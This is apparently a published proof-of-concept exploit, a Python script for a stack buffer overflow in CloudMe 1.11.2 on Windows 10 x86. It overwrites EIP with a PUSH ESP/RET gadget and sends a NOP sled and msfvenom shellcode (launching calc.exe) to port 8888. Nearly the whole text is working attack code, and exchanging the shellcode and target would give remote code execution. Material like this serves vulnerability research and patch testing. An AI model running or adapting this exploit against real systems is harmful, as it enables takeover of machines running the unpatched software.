# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xd9\xca\xbd\xc4\xf7\x64\xb6\xd9\x74\x24\xf4\x58"
payload += b"\x33\xc9\xb1\x3e\x83\xe8\xfc\x31\x68\x15\x03\x68"
payload += b"\x15\x26\x02\x98\x5e\x24\xed\x61\x9f\x48\x67\x84"
payload += b"\xae\x48\x13\xcc\x81\x78\x57\x80\x2d\xf3\x35\x31"
payload += b"\xa5\x71\x92\x36\x0e\x3f\xc4\x79\x8f\x13\x34\x1b"
payload += b"\x13\x69\x69\xfb\x2a\xa2\x7c\xfa\x6b\xde\x8d\xae"
payload += b"\x24\x95\x20\x5f\x40\xe3\xf8\xd4\x1a\xe2\x78\x08"
payload += b"\xea\x05\xa8\x9f\x60\x5c\x6a\x21\xa4\xd5\x23\x39"
payload += b"\xa9\xd3\xfa\xb2\x19\xa8\xfc\x12\x50\x51\x52\x5b"
payload += b"\x5c\xa0\xaa\x9b\x5b\x5a\xd9\xd5\x9f\xe7\xda\x21"
payload += b"\xdd\x33\x6e\xb2\x45\xb0\xc8\x1e\x77\x15\x8e\xd5"
payload += b"\x7b\xd2\xc4\xb2\x9f\xe5\x09\xc9\xa4\x6e\xac\x1e"
payload += b"\x2d\x34\x8b\xba\x75\xef\xb2\x9b\xd3\x5e\xca\xfc"
payload += b"\xbb\x3f\x6e\x76\x51\x54\x03\xd5\x3c\xab\x91\x63"
payload += b"\x72\xab\xa9\x6b\x23\xc3\x98\xe0\xac\x94\x24\x23"
payload += b"\x89\x6a\x6f\x6e\xb8\xe2\x36\xfa\xf8\x6f\xc9\xd0"
payload += b"\x3f\x89\x4a\xd1\xbf\x6e\x52\x90\xba\x2b\xd4\x48"
payload += b"\xb7\x24\xb1\x6e\x64\x45\x90\x0c\xb0\xe5\x63\xb2"
payload += b"\xa9\x65\xe4\x68\x5a\xf1\x60\xfe\xf9\x8a\x34\x67"
payload += b"\x87\x01\x99\x12\x07\xb5\x4e\xbc\x83\x19\xff\x5d"
payload += b"\x62\xc4\x87\xc4\x5a\x2b\x1d\x27\xf8\x5e\xb9\x09"
payload += b"\x9b\xd8\x24\x76\x52\x28\x89\x47\xa4\x66\xe4\x93"
payload += b"\xea\x47\x30\xfc\xc0\x95\x0e\xce\x24"



overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
